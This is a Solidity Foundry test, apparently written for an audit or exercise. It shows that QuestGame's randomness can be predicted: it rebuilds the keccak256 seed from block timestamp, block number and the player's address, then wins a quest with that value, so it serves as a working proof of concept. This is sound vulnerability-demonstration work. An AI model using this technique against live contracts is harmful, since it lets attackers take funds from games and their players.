
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "forge-std/Test.sol";
import "../src/QuestGame.sol";

contract TestWeakRandomnessQuestGame is Test {

    QuestGame public questGame;

    function setUp() public {
        vm.deal(address(this), 20 ether);
        questGame = new QuestGame{value: 10 ether}();
    }

    function test_highlightPredictableRandomValue(uint256 blockTimestamp, uint256 blockNumber) public {
        
        vm.assume(blockTimestamp >= 1 hours);
        vm.assume(blockNumber > 0);
        
        vm.warp(blockTimestamp);
        vm.roll(blockNumber);
        
        address player = address(this);
        uint256 seed = uint256(
            keccak256(
                abi.encodePacked(
                    block.timestamp, 
                    block.number, 
                    player 
                )
            )
        );

        uint256 expectedNumber = seed % 100;
                
        questGame.attemptQuest{value: 0.1 ether}(expectedNumber);

        (uint256 exp, uint256 wins) = questGame.getPlayerStats(address(this));
        assertEq(exp, 100);
        assertEq(wins, 1);
    }
}
